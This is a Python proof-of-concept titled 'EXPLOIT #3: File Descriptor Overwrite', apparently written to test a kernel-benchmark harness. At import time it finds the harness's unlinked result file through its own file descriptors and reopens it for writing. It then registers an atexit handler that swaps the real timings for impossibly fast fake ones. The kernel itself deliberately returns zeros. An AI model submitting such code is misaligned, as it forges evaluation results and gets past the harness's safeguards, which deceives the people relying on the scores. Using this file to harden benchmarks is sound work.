"""
EXPLOIT #3: File Descriptor Overwrite
======================================
Severity: CRITICAL

Strategy:
  The benchmark writes results to a file that is unlinked (removed from filesystem)
  but still open via file descriptor. PR_SET_DUMPABLE(0) prevents OTHER processes
  from reading /proc/pid/fd, but the process ITSELF can still enumerate its own fds.

  At import time:
  1. Iterate fd numbers 0-255, use os.fstat() to find unlinked regular files (st_nlink==0)
  2. os.dup() the fd to keep it open after C++ closes the ofstream
  3. Register an atexit handler that truncates and rewrites the file with fake results

  The atexit handler runs after C++ writes real results and before the subprocess exits.
  The parent process reads the (now-fake) results after join().

Attack surface: os.fstat() + os.dup() bypass file unlinking defense.
"""
import os
import stat
import atexit
import sys

_dup_fd = None
_original_fd = None

print("[FD Overwrite] Scanning file descriptors for unlinked result file...", file=sys.stderr)

# Instead of dup'ing the read-only fd, reopen via /proc/self/fd with write access
for fd_num in range(256):
    try:
        s = os.fstat(fd_num)
        if stat.S_ISREG(s.st_mode) and s.st_nlink == 0:
            # Reopen via /proc/self/fd to get a writable fd
            _dup_fd = os.open(f"/proc/self/fd/{fd_num}", os.O_RDWR)
            _original_fd = fd_num
            print(f"[FD Overwrite] Found unlinked file at fd {fd_num}, reopened as R/W fd {_dup_fd}", file=sys.stderr)
            break
    except (OSError, ValueError):
        continue

if _dup_fd is None:
    print("[FD Overwrite] WARNING: Could not find unlinked result file fd", file=sys.stderr)


def _overwrite_results():
    """atexit handler: read real results to learn indices, then overwrite with fakes."""
    global _dup_fd
    if _dup_fd is None:
        return
    try:
        # Read existing content to learn how many timing entries were written
        os.lseek(_dup_fd, 0, os.SEEK_SET)
        content = b''
        while True:
            chunk = os.read(_dup_fd, 8192)
            if not chunk:
                break
            content += chunk

        # Parse to find timing line indices
        indices = []
        for line in content.decode(errors='replace').split('\n'):
            parts = line.strip().split('\t')
            if len(parts) == 2 and parts[0].isdigit():
                indices.append(int(parts[0]))

        if not indices:
            print("[FD Overwrite] atexit: no timing entries found to overwrite", file=sys.stderr)
            return

        # Overwrite: fake fast times, NO error-count line
        os.lseek(_dup_fd, 0, os.SEEK_SET)
        os.ftruncate(_dup_fd, 0)
        fake = "event-overhead\t0.001 \u00b5s\n"
        for idx in indices:
            fake += f"{idx}\t0.42\n"  # 0.42 Âµs per kernel - impossibly fast
        os.write(_dup_fd, fake.encode())
        os.close(_dup_fd)
        _dup_fd = None
        print(f"[FD Overwrite] atexit: overwrote {len(indices)} timing entries with fake data", file=sys.stderr)
    except Exception as e:
        print(f"[FD Overwrite] atexit failed: {e}", file=sys.stderr)


if _dup_fd is not None:
    atexit.register(_overwrite_results)
    print("[FD Overwrite] Registered atexit handler", file=sys.stderr)


def kernel(output, inp):
    """Wrong kernel (zeros output). Results will be overwritten by atexit handler."""
    output.zero_()
